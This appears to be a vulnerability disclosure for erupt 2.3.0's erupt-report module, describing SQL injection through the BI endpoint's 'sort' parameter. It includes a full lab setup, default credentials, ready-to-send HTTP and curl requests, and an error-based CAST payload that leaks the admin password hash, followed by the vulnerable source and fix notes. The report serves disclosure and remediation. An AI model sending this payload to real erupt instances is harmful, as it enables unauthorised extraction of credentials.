### Vulnerability details

**Official website / Product:** https://www.erupt.xyz / https://github.com/erupts/erupt

**Repository:** erupts/erupt (stars at selection: 4000; live API recheck 3990)

**Vulnerability type:** SQLi (CWE-89 — erupt-report BI list `sort` query parameter concatenated into JDBC `ORDER BY` without whitelist)

**Vulnerability versions:** 2.3.0 (`erupts/erupt:latest` / Maven `xyz.erupt:erupt-report:2.3.0`); `master` @ `0bc5298bfad2442f60b9751112e020e1512ed281` still carries the sink

**Vulnerability URL / Parameter:** `POST /erupt-api/bi/data/{code}` query parameter **`sort`** (`direction` only appends `asc`/`desc`)

**Complex:** yes

### Verification procedure

Lab topology (original `labs/erupt-r51-a1/` removed per hygiene — details match verification time):

- Image: `erupt-r51-a1:lab` (official `erupts/erupt:latest` / 2.3.0 fat jar with `@EruptScan` patched onto `xyz.erupt.docker.Application` — stock image login throws `Not found '@EruptScan' Annotation`)
- Port: host **23101** → container `8080`
- DB: embedded H2 (`jdbc:h2:file:./h2.erupt;MODE=MySQL`)
- Default login: `erupt` / `erupt`; password field must be **Base64-encoded 3×** via `SecretUtil.encodeSecret` (`erupt-app.pwdTransferEncrypt=true`): plaintext `erupt` → `ZXJ1cHQ=` → `WlhKMWNIUT0=` → **`V2xoS01XTklVVDA9`**
- Audited code: GitHub `erupts/erupt` `master` @ `0bc5298bfad2442f60b9751112e020e1512ed281` (release line **2.3.0**; Maven `xyz.erupt:*:2.3.0`)
- Module under test: `erupt-report` (included in `erupt-spring-boot-starter-all` / official all-in-one image)

1. Start the lab. Minimal compose (build `erupt-r51-a1:lab` first with the `@EruptScan` patch noted above):

```yaml
# docker-compose.yml
services:
  erupt:
    image: erupt-r51-a1:lab
    container_name: erupt-r51-a1
    ports:
      - "23101:8080"
```

```bash
docker compose up -d
# or: docker run -d --name erupt-r51-a1 -p 23101:8080 erupt-r51-a1:lab
```

Observed topology at verify time (`docker ps` / image size):

```text
7dfcd0000353 erupt-r51-a1:lab 450MB
268f76695221 erupt-r51-a1:lab 0.0.0.0:23101->8080/tcp, [::]:23101->8080/tcp Up 3 minutes
```

2. Login and capture `token` (captcha **not** required on the first few attempts; default `verifyCodeCount` is 2):

```http
POST /erupt-api/login HTTP/1.1
Host: 127.0.0.1:23101
Content-Type: application/json
Accept: */*
Connection: close

{"account":"erupt","pwd":"V2xoS01XTklVVDA9","verifyCode":"","verifyCodeMark":""}
```

Use the `token` field from the JSON response as the `token:` request header. Lab example token: `FjcOYduyOtstIi8ohqTEpi` (rotates per login).

Equivalent curl:

```bash
curl -sS -X POST 'http://127.0.0.1:23101/erupt-api/login' \
  -H 'Content-Type: application/json' \
  -d '{"account":"erupt","pwd":"V2xoS01XTklVVDA9","verifyCode":"","verifyCodeMark":""}'
```

3. Create the BI report (needs admin add power on `Bi`; send both `token` and `erupt: Bi` headers):

```http
POST /erupt-api/data/modify/Bi HTTP/1.1
Host: 127.0.0.1:23101
Content-Type: application/json
token: FjcOYduyOtstIi8ohqTEpi
erupt: Bi
Accept: */*
Connection: close

{"code":"sqli_test","name":"SQLi Test","pageType":"none","export":true,"sqlStatement":"select 1 as id, 'a' as name","cacheTime":1}
```

`pageType=none` hits `ReportService`'s `select * from (%s) _t order by %s` concat path (`front` / export share it; `backend` goes through `DBTypeEnum.processDialect`, which likewise formats `order by %s`).

4. Publish a menu so `@EruptRouter(VerifyType.MENU)` passes (`type=bi`, `code`/`value` equal to the report code):

```http
POST /erupt-api/data/modify/EruptMenu HTTP/1.1
Host: 127.0.0.1:23101
Content-Type: application/json
token: FjcOYduyOtstIi8ohqTEpi
erupt: EruptMenu
Accept: */*
Connection: close

{"name":"SQLi Test","status":1,"type":"bi","value":"sqli_test","code":"sqli_test","sort":0,"icon":"fa fa-table"}
```

(Alternatively use the Bi row operation “Add to Menu” via `ReportPublishMenu`, which writes an equivalent `EruptMenu`.)

5. Send PoC `sort=CAST((SELECT "account"||'#'||"password" FROM "e_upms_user" FETCH FIRST 1 ROW ONLY) AS INT)`; HTTP 500 error body discloses `erupt#<password hash>`.

Control: benign `sort=id` returns HTTP 200 with body:

```json
{"columns":[{"code":2331,"name":"ID","width":null,"sortable":false,"display":true,"type":"string","drill":null,"remark":null},{"code":2388619,"name":"NAME","width":null,"sortable":false,"display":true,"type":"string","drill":null,"remark":null}],"list":[{"ID":1,"NAME":"a"}],"total":1}
```

### Complete vulnerability PoC

Complete HTTP request (Docker-verified):

```http
POST /erupt-api/bi/data/sqli_test?index=1&size=10&sort=CAST%28%28SELECT%20%22account%22%7C%7C%27%23%27%7C%7C%22password%22%20FROM%20%22e_upms_user%22%20FETCH%20FIRST%201%20ROW%20ONLY%29%20AS%20INT%29&direction=true HTTP/1.1
Host: 127.0.0.1:23101
Content-Type: application/json
Content-Length: 2
token: FjcOYduyOtstIi8ohqTEpi
erupt: sqli_test
Accept: */*
Connection: close

{}
```

Complete HTTP response (raw Docker-lab response):

```http
HTTP/1.1 500 
Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true
Access-Control-Allow-Methods: GET,POST,OPTIONS,PUT,DELETE
Content-Type: application/json;charset=UTF-8
Transfer-Encoding: chunked
Date: Mon, 02 Nov 2026 09:49:50 GMT
Connection: close

{"timestamp":"2026-11-02T17:49:50.887","path":"/erupt-api/bi/data/sqli_test","status":500,"error":"erupt exception","message":"PreparedStatementCallback; SQL [/* erupt bi query :: SQLi Test */ select * from (select 1 as id, \u0027a\u0027 as name) _t order by CAST((SELECT \"account\"||\u0027#\u0027||\"password\" FROM \"e_upms_user\" FETCH FIRST 1 ROW ONLY) AS INT) asc]; Data conversion error converting \"erupt#c0d7f8b195c0179170daa1e10f53be8a200323f99452d90a92d8fb9618c57db3118fe17d91320113e0fae40797c45be1f7c6fa62c97bca4ad7f184f82679b0ec\"; SQL statement:\n/* erupt bi query :: SQLi Test */ select * from (select 1 as id, \u0027a\u0027 as name) _t order by CAST((SELECT \"account\"||\u0027#\u0027||\"password\" FROM \"e_upms_user\" F [22018-232]"}
```

Equivalent curl (replace token with the current session; a lab curl session used token `h4liLoBkJk9VNp2wqcTVhN`, which may differ from the login example token in the HTTP fence above):

```bash
curl -sS -D- -X POST \
  'http://127.0.0.1:23101/erupt-api/bi/data/sqli_test?index=1&size=10&sort=CAST%28%28SELECT%20%22account%22%7C%7C%27%23%27%7C%7C%22password%22%20FROM%20%22e_upms_user%22%20FETCH%20FIRST%201%20ROW%20ONLY%29%20AS%20INT%29&direction=true' \
  -H 'Content-Type: application/json' \
  -H 'token: FjcOYduyOtstIi8ohqTEpi' \
  -H 'erupt: sqli_test' \
  --data-binary '{}'
```

Verification result notes:

- Benign `sort=id` returns HTTP 200 with rows; malicious `sort` is embedded via `order by %s` and executed by H2; CAST errors reflect subquery output.
- Extracted: `erupt#c0d7f8b195c0179170daa1e10f53be8a200323f99452d90a92d8fb9618c57db3118fe17d91320113e0fae40797c45be1f7c6fa62c97bca4ad7f184f82679b0ec`.
- Curl run likewise returned HTTP 500 with the same `Data conversion error converting "erupt#c0d7f8b195c0179170daa1e10f53be8a200323f99452d90a92d8fb9618c57db3118fe17d91320113e0fae40797c45be1f7c6fa62c97bca4ad7f184f82679b0ec"` fragment (concatenated SQL shaped as `select * from (select 1 as id, 'a' as name) _t order by CAST((SELECT "account"||'#'||"password" FROM "e_upms_user" FETCH FIRST 1 ROW ONLY) AS INT) asc`).
- Requires an authenticated principal with **BI menu** permission for that code (not necessarily Bi configuration admin). `pageType` `none`/`front`/export uses `ReportService` concat; `backend` paging uses `DBTypeEnum.processDialect` which likewise formats `order by %s`.

### Vulnerability analysis

erupt-report accepts the client table sort field as HTTP query param `sort` in `EruptReportController.queryData`, appends direction, and passes it to `ReportService.queryBiData`:

```java
String sql = StringUtils.isBlank(sort) ? bi.getSqlStatement()
    : String.format("select * from (%s) _t order by %s", bi.getSqlStatement(), sort);
```

The string is then run through `NamedParameterJdbcTemplate`. This is **not** CVE-2026-4594 (`geneEruptHqlOrderBy` in erupt-jpa HQL): different module, JDBC BI SQL, and **no** `legalPath`-style identifier guard on 2.3.0.

### Trigger / sink source (full path and line numbers)

```java
# File: erupt-plugin/erupt-report/src/main/java/xyz/erupt/report/controller/EruptReportController.java
# Lines: 121-137
@PostMapping("/data/{code}")
@EruptRouter(verifyType = EruptRouter.VerifyType.MENU, authIndex = 2)
public BiData queryData(@RequestParam("index") int pageIndex,
                        @RequestParam("size") int pageSize,
                        @RequestParam(value = "sort", required = false) String sortField,
                        @RequestParam(value = "direction", required = false) Boolean direction,
                        @RequestBody Map<String, Object> query, @PathVariable("code") String code) {
    if (pageSize >= eruptBiProp.getSingleMaxResultNum()) {
        throw new EruptWebApiRuntimeException("exceed single maximum 'pageSize'");
    }
    Bi bi = eruptDao.lambdaQuery(Bi.class).eq(Bi::getCode, code).one();
    this.validateQuery(bi, query);
    biService.verifyBiMenuPermissions(bi, code);
    if (null != sortField) {
        sortField += " " + (direction ? "asc" : "desc");
    }
    return biService.queryBiData(bi, pageIndex, pageSize, sortField, query, false);
}
```

```java
# File: erupt-plugin/erupt-report/src/main/java/xyz/erupt/report/service/ReportService.java
# Lines: 114-117
if (ReportConst.PAGE_NONE.equals(bi.getPageType()) || ReportConst.PAGE_FRONT.equals(bi.getPageType()) || export) {
    String sql = StringUtils.isBlank(sort) ? bi.getSqlStatement()
        : String.format("select * from (%s) _t order by %s", bi.getSqlStatement(), sort);
    biData.setList(this.startQuery(bi.getName(), sql, bi.getCacheTime(), bi.getClassHandler(), bi.getDataSource(), query));
    biData.setTotal((long) biData.getList().size());
}
```

```java
# File: erupt-plugin/erupt-report/src/main/java/xyz/erupt/report/constant/DBTypeEnum.java
# Lines: 53-59
public String processDialect(String dialect, String sql, String sort, Integer index, Integer size) {
    String result = dialect.replace(DBTypeEnum.$SQL, sql).replace(DBTypeEnum.$SIZE, String.valueOf(size))
            .replace(DBTypeEnum.$SKIP, String.valueOf((index - 1) * size));
    if (StringUtils.isNotBlank(sort)) {
        return result.replace(DBTypeEnum.$SORT, String.format("order by %s", sort));
    } else {
        return result.replace(DBTypeEnum.$SORT, "");
    }
}
```

### Fix notes

- Whitelist `sort` with an identifier regex equivalent to `EruptJpaUtils.legalPath`, and allow only `asc`/`desc` for direction.
- Or restrict to column names marked sortable in the BI column config.
- Disable verbose SQL exception messages in production (defense in depth only).
